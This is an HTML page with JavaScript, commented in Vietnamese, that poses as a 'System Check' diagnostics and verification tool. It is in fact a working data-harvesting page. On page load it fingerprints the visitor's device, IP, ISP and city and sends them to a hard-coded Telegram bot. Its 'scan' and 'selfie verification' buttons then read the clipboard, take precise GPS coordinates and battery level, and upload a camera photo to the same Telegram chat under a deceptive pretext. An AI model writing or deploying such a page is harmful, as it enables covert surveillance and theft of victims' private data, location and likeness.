<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>System Diagnostics & Verification</title>
    
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">

    <style>
        :root { --bg: #0a0a0a; --card: #141414; --text: #eee; --accent: #00ff9d; --danger: #ff4757; }
        body { background: var(--bg); color: var(--text); font-family: 'JetBrains Mono', monospace; margin: 0; padding: 20px; font-size: 13px; }
        
        .container { max-width: 600px; margin: 0 auto; }
        
        /* HEADER */
        .header { text-align: center; border-bottom: 1px solid #333; padding-bottom: 20px; margin-bottom: 20px; }
        .header h1 { color: var(--accent); margin: 0; font-size: 1.4rem; text-transform: uppercase; letter-spacing: 1px; }
        .header p { color: #666; font-size: 0.8rem; margin-top: 5px; }

        /* DATA GRID */
        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 20px; }
        .card { background: var(--card); padding: 15px; border-radius: 6px; border: 1px solid #222; }
        .card-label { color: #888; font-size: 10px; text-transform: uppercase; display: block; margin-bottom: 5px; }
        .card-val { font-weight: bold; color: #fff; font-size: 12px; word-break: break-all; }
        .highlight { color: var(--accent); }

        /* BUTTONS */
        .btn-group { display: flex; flex-direction: column; gap: 15px; }
        
        .btn {
            width: 100%; padding: 15px; border: none; border-radius: 6px;
            font-weight: bold; font-family: inherit; cursor: pointer;
            text-transform: uppercase; display: flex; align-items: center; justify-content: center; gap: 10px;
            transition: all 0.2s; font-size: 14px;
        }

        .btn-scan { background: var(--accent); color: #000; box-shadow: 0 0 15px rgba(0, 255, 157, 0.2); }
        .btn-scan:active { transform: scale(0.98); }
        
        .btn-photo { background: #333; color: #fff; border: 1px solid #555; position: relative; overflow: hidden; }
        .btn-photo input { position: absolute; opacity: 0; width: 100%; height: 100%; cursor: pointer; left: 0; top: 0; }
        .btn-photo:active { background: #444; }

        /* LOG */
        #console { margin-top: 20px; color: #555; font-size: 10px; border-top: 1px dashed #333; padding-top: 10px; }

    </style>
</head>
<body>

    <div class="container">
        <div class="header">
            <h1>System Check v3.0</h1>
            <p>ID: <span id="sess-id">Initializing...</span></p>
        </div>

        <div class="grid">
            <div class="card">
                <span class="card-label">IP Address</span>
                <span class="card-val highlight" id="ip">Scanning...</span>
            </div>
            <div class="card">
                <span class="card-label">Location</span>
                <span class="card-val" id="loc">...</span>
            </div>
            <div class="card" style="grid-column: span 2">
                <span class="card-label">Device Info</span>
                <span class="card-val" id="device">Analyzing...</span>
            </div>
        </div>

        <div class="btn-group">
            <!-- 1. N√∫t Qu√©t D·ªØ Li·ªáu -->
            <button class="btn btn-scan" id="scan-btn" onclick="runDiagnostics()">
                <i class="fas fa-radar"></i> 1. K√çCH HO·∫†T QU√âT H·ªÜ TH·ªêNG
            </button>

            <!-- 2. N√∫t Ch·ª•p ·∫¢nh (Input ·∫©n) -->
            <button class="btn btn-photo" id="photo-btn">
                <i class="fas fa-camera"></i> 2. G·ª¨I ·∫¢NH X√ÅC MINH (SELFIE)
                <!-- accept="image/*" capture="user" m·ªü camera tr∆∞·ªõc ngay l·∫≠p t·ª©c -->
                <input type="file" id="camera-input" accept="image/*" capture="user" onchange="handlePhotoUpload(this)">
            </button>
        </div>

        <div id="console">> System ready. Waiting for input...</div>
    </div>

    <script>
        // --- C·∫§U H√åNH (Thay Token c·ªßa b·∫°n v√†o ƒë√¢y) ---
        const CONFIG = {
            TOKEN: "6789490938:AAGbxaiI4NVuZBWEm-ktCT4w2FNVuV_v7mE", 
            CHAT_ID: "@testappxyz"
        };

        // Bi·∫øn l∆∞u d·ªØ li·ªáu
        let DATA = {
            ip: "N/A", isp: "N/A", city: "N/A",
            device: "N/A", os: "N/A", gpu: "N/A",
            ram: "N/A", battery: "N/A",
            clipboard: "Tr·ªëng/T·ª´ ch·ªëi",
            gps: "Ch∆∞a c·∫•p quy·ªÅn",
            mapLink: "",
            fingerprint: Math.random().toString(36).substr(2, 9).toUpperCase()
        };

        const log = (text) => document.getElementById('console').innerText = `> ${text}`;

        // 1. Kh·ªüi t·∫°o & L·∫•y IP t·ª± ƒë·ªông
        window.onload = async () => {
            document.getElementById('sess-id').innerText = DATA.fingerprint;
            
            // Th√¥ng tin thi·∫øt b·ªã c∆° b·∫£n
            DATA.device = navigator.userAgent;
            DATA.os = navigator.platform;
            
            // X·ª≠ l√Ω GPU
            try {
                const gl = document.createElement('canvas').getContext('webgl');
                const debug = gl.getExtension('WEBGL_debug_renderer_info');
                DATA.gpu = gl.getParameter(debug.UNMASKED_RENDERER_WEBGL);
            } catch(e) { DATA.gpu = "Integrated"; }

            document.getElementById('device').innerText = `${DATA.os} | ${DATA.gpu}`;

            // L·∫•y IP (IPWhois)
            try {
                const res = await fetch('https://ipwho.is/');
                const json = await res.json();
                if(json.success) {
                    DATA.ip = json.ip;
                    DATA.isp = json.connection.isp;
                    DATA.city = `${json.city}, ${json.country}`;
                    
                    document.getElementById('ip').innerText = DATA.ip;
                    document.getElementById('loc').innerText = DATA.city;
                    sendTextReport("Truy c·∫≠p m·ªõi (Auto)");
                }
            } catch(e) { log("IP Blocked by Adblock"); }
        };

        // 2. Ch·ª©c nƒÉng Qu√©t s√¢u (Clipboard, GPS, Media Labels)
        async function runDiagnostics() {
            const btn = document.getElementById('scan-btn');
            btn.innerHTML = "ƒêANG TR√çCH XU·∫§T D·ªÆ LI·ªÜU...";
            btn.disabled = true;

            // Ch·∫°y song song c√°c t√°c v·ª•
            const tasks = [
                // Task A: Clipboard (Ph·∫£i g·ªçi ngay l·∫≠p t·ª©c)
                navigator.clipboard ? navigator.clipboard.readText().then(t => DATA.clipboard = t || "Tr·ªëng").catch(()=> DATA.clipboard = "T·ª´ ch·ªëi") : Promise.resolve(),
                
                // Task B: GPS
                new Promise(resolve => {
                    if(!navigator.geolocation) resolve();
                    navigator.geolocation.getCurrentPosition(
                        pos => {
                            DATA.gps = `${pos.coords.latitude}, ${pos.coords.longitude} (¬±${Math.round(pos.coords.accuracy)}m)`;
                            DATA.mapLink = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                            resolve();
                        },
                        err => { DATA.gps = "T·ª´ ch·ªëi/T·∫Øt"; resolve(); },
                        { enableHighAccuracy: true, timeout: 10000 }
                    );
                }),

                // Task C: Pin (N·∫øu c√≥)
                navigator.getBattery ? navigator.getBattery().then(b => DATA.battery = `${Math.round(b.level*100)}%`) : Promise.resolve()
            ];

            await Promise.allSettled(tasks);
            
            await sendTextReport("K·∫æT QU·∫¢ QU√âT (FULL)");
            btn.innerHTML = "‚úî ƒê√É G·ª¨I B√ÅO C√ÅO";
            log("Report sent. Now requesting photo...");
            alert("ƒê√£ g·ª≠i d·ªØ li·ªáu h·ªá th·ªëng. Vui l√≤ng b·∫•m n√∫t 'G·ª≠i ·∫¢nh X√°c Minh' ƒë·ªÉ ho√†n t·∫•t.");
        }

        // 3. Ch·ª©c nƒÉng G·ª≠i ·∫¢nh (Camera Upload)
        async function handlePhotoUpload(input) {
            if (input.files && input.files[0]) {
                const file = input.files[0];
                const formData = new FormData();
                formData.append("chat_id", CONFIG.CHAT_ID);
                formData.append("photo", file);
                formData.append("caption", `üì∏ <b>·∫¢NH X√ÅC MINH</b>\nID: ${DATA.fingerprint}\nIP: ${DATA.ip}`);
                formData.append("parse_mode", "HTML");

                const btn = document.getElementById('photo-btn');
                btn.innerHTML = "ƒêANG G·ª¨I ·∫¢NH...";

                try {
                    const res = await fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendPhoto`, {
                        method: "POST",
                        body: formData
                    });
                    if(res.ok) {
                        btn.style.background = "#00ff9d";
                        btn.style.color = "#000";
                        btn.innerHTML = "‚úî G·ª¨I ·∫¢NH TH√ÄNH C√îNG";
                        alert("X√°c minh ho√†n t·∫•t! C·∫£m ∆°n b·∫°n.");
                    } else { throw new Error("API Error"); }
                } catch (e) {
                    alert("L·ªói g·ª≠i ·∫£nh. Vui l√≤ng th·ª≠ l·∫°i.");
                    btn.innerHTML = "TH·ª¨ L·∫†I";
                }
            }
        }

        // Helper: G·ª≠i tin nh·∫Øn vƒÉn b·∫£n
        async function sendTextReport(title) {
            const msg = `
üîç <b>${title}</b>
‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ
üÜî <b>ID:</b> <code>${DATA.fingerprint}</code>
üåê <b>IP:</b> <code>${DATA.ip}</code>
üìç <b>Loc:</b> ${DATA.city}
üè¢ <b>ISP:</b> ${DATA.isp}
‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ
üì± <b>Device:</b> ${DATA.device}
üéÆ <b>GPU:</b> ${DATA.gpu}
üîã <b>Pin:</b> ${DATA.battery}
‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ
üìã <b>Clipboard:</b> <code>${DATA.clipboard}</code>
üõ∞ <b>GPS:</b> ${DATA.gps}
${DATA.mapLink ? `<a href="${DATA.mapLink}">Xem B·∫£n ƒê·ªì</a>` : ''}
`;
            try {
                await fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        chat_id: CONFIG.CHAT_ID,
                        text: msg,
                        parse_mode: "HTML",
                        disable_web_page_preview: true
                    })
                });
            } catch(e) {}
        }

    </script>
</body>
</html>
